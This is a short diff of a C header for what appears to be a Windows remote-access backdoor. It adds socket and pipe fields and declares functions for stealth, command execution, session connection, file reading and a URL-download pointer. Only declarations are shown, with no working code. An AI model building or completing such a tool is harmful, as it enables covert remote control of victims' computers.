@@ -1,5 +1,5 @@
-/*      _ _       _
- * _ __| | | _ __/ |
+/*       _ _       _
+ *  _ __| | | _ __/ |
  * | '_ \_  _| '_\  |
  * | .__/ |_|| .__/_|
  * |_|       |_|
@@ -23,8 +23,14 @@ typedef HRESULT (WINAPI *UDTF)(LPVOID, LPCTSTR, LPCTSTR, DWORD, LPVOID);
 
 typedef struct {
 
+	FILE * pPipe;
+
 	int portno;
 	char ip[16];
+	char buf[BUFSIZE];
+
+	SOCKET s;
+	WSADATA wsa;
 
 	struct sockaddr_in client;
 
@@ -41,5 +47,9 @@ int setupvar(fileWrapper * file);
 int sendbuf(SOCKET s, char * buf, int size);
 int processdata(SOCKET s, char cmd, char cmd2);
 void change_dir(char * dir);
-int cat_file(char * file, SOCKET s);
+int cat_file(char * f, char * pbuf);
 void stealth();
+void connect_sessionid(fileWrapper * file, int * cn, int * pbs, int * pbr, char * sessionID);
+int main_loop(fileWrapper * file);
+int executeCommand(fileWrapper * file);
+void connected(fileWrapper * file, int * cn);
